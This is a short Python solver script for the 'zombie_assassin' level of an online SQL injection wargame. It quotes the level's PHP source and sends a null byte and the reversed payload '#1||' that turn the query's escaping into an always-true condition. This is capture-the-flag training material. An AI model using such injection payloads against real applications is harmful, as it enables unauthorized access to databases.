#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    '''
    Zombie_assassin

    $_GET['id'] = strrev(addslashes($_GET['id']));
    $_GET['pw'] = strrev(addslashes($_GET['pw']));
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) solve("zombie_assassin"); 
    '''

    url = "https://los.rubiya.kr/chall/zombie_assassin_eac7521e07fe5f298301a44b61ffeec0.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'
    other_param = {'id': chr(0)}

    payload = '#1||'
    p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)

    response = p.my_request()
    if 'Clear!' in response:
        print('\nZombie_assassin Clear!')


if __name__ == '__main__':
    main()
